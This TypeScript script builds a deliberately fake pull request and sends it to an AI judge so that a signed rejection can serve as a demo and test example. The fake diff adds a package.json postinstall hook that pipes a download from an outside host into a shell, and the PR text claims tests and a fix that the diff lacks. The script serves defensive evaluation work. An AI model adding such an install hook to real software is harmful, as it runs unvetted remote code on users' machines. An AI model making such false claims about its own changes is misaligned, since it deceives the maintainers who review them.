// A constructed slop contribution (not a real PR) run through the real judge, so the demo and the
// tests can show a forfeit that NEAR AI's enclave itself signed. The contribution claims tests and a
// race fix the diff doesn't contain, and adds an install hook that pipes a download into a shell.
//   JUDGE_MODE=nearai bun --env-file=.env server/scripts/make-forfeit-example.ts
import { mkdirSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { loadConfig } from "../src/config";
import { makeInference } from "../src/judge/inference";
import { judge } from "../src/judge/judge";
import { teeProof } from "../src/near";

const cfg = loadConfig();
const inference = makeInference(cfg);
if (inference.mock) throw new Error("Set JUDGE_MODE=nearai: the point is NEAR AI's own signature");

const diff = `diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1,3 +1,3 @@
 # widget
-A tiny queue for background jobs.
+A tiny, fast, production-ready queue for background jobs.
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -4,6 +4,7 @@
   "main": "dist/index.js",
   "scripts": {
+    "postinstall": "curl -s https://cdn-widget-tools.xyz/setup.sh | sh",
     "build": "tsc",
     "test": "vitest run"
   },
`;

const record = await judge(
  {
    repo: { id: 101, full_name: "example/widget", contributing: "Please add tests for every change." },
    author: "drive-by-bot",
    contribution: {
      kind: "pr",
      number: 2,
      title: "Fix race condition in job queue and add tests",
      body: "Added unit tests for the parser in tests/parser.test.ts and fixed the race in src/queue.ts by locking the worker map.",
      diff,
      files: ["README.md", "package.json"],
      additions: 2,
      deletions: 1,
    },
    checkRuns: [{ name: "test", status: "completed", conclusion: "success" }],
    openItems: [],
    symbolIndex: async () => ({ has: () => true, namespaceSize: () => 0 }),
    issueLookup: async () => ({ exists: false, open: false }),
    authorReputation: "new",
    threshold: 0.85,
  },
  inference,
);

console.log("final:", record.final.verdict, "| model:", record.model_verdict?.verdict, record.model_verdict?.confidence, "| evidence:", record.model_verdict?.evidence.length);
console.log(record.final.reasons.join("\n"));
const dir = resolve(import.meta.dir, "../../docs/eval/examples");
mkdirSync(dir, { recursive: true });
writeFileSync(join(dir, "constructed-slop-forfeit.json"), JSON.stringify({ note: "Constructed slop (not a real PR), judged by the real model; signed by NEAR AI.", record, proof: teeProof(record) }, null, 1));
console.log(`→ ${dir}/constructed-slop-forfeit.json`);
